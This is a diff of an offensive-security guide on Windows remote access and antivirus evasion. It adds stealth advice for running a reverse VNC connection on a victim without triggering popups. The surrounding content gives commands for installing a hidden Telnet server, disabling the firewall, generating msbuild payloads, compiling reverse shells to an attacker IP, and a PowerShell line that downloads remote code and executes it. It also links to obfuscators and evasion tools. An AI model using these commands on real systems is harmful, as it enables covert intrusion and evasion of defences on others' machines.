@@ -2,30 +2,30 @@
 
 ## **Telnet Server**
 
-Until Windows10, all Windows came with a **Telnet server** that you could install \(as administrator\) doing:
+Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
 
-```text
+```
 pkgmgr /iu:"TelnetServer" /quiet
 ```
 
 Make it **start** when the system is started and **run** it now:
 
-```text
+```
 sc config TlntSVR start= auto obj= localsystem
 ```
 
-**Change telnet port** \(stealth\) and disable firewall:
+**Change telnet port** (stealth) and disable firewall:
 
-```text
+```
 tlntadmn config port=80
 netsh advfirewall set allprofiles state off
 ```
 
 ## UltraVNC
 
-Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)
+Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)
 
-**Execute** _**winvnc.exe**_ and configure the server:
+**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:
 
 * Enable the option _Disable TrayIcon_
 * Set a password in _VNC Password_
@@ -35,14 +35,19 @@ Then, move the binary _**winvnc.exe**_ and **newly** created file _**UltraVNC.in
 
 ### **Reverse connection**
 
-The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**.  
-Then, it should execute inside the **victim**: `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**.
+Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
+
+**WARNING:** To maintain stealth you must not do a few things
+- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
+- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
+- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)
 
 ## GreatSCT
 
 Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
 
-```text
+```
 git clone https://github.com/GreatSCT/GreatSCT.git
 cd GreatSCT/setup/
 ./setup.sh
@@ -52,7 +57,7 @@ cd ..
 
 Inside GreatSCT:
 
-```text
+```
 use 1
 list #Listing available payloads
 use 9 #rev_tcp.py
@@ -64,7 +69,7 @@ generate #payload is the default name
 
 Now **start the lister** with `msfconsole -r file.rc` and **execute** the **xml payload** with:
 
-```text
+```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 ```
 
@@ -72,23 +77,23 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 
 ## Compiling our own reverse shell
 
- https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
+&#x20;https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
-#### First C\# Revershell
+#### First C# Revershell
 
 Compile it with:
 
-```text
+```
 c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
 ```
 
 Use it with:
 
-```text
+```
 back.exe <ATTACKER_IP> <PORT>
 ```
 
-```text
+```
 using System;
 using System.Text;
 using System.IO;
@@ -160,11 +165,11 @@ namespace ConnectBack
 }
 ```
 
-[https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs)
+[https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)
 
-## C\# using compiler
+## C# using compiler
 
-```text
+```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
 ```
 
@@ -174,7 +179,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe RE
 
 Automatic download and execution:
 
-```text
+```
 64bit:
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
 
@@ -184,11 +189,11 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 
 {% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}
 
-C\# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
+C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
 ## C++
 
-```text
+```
 sudo apt-get install mingw-w64
 
 i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
@@ -238,6 +243,4 @@ https://github.com/praetorian-code/vulcan
 {% embed url="https://github.com/EgeBalci/sgn" %}
 
 {% embed url="https://github.com/persianhydra/Xeexe-TopAntivirusEvasion" %}
-
-
 
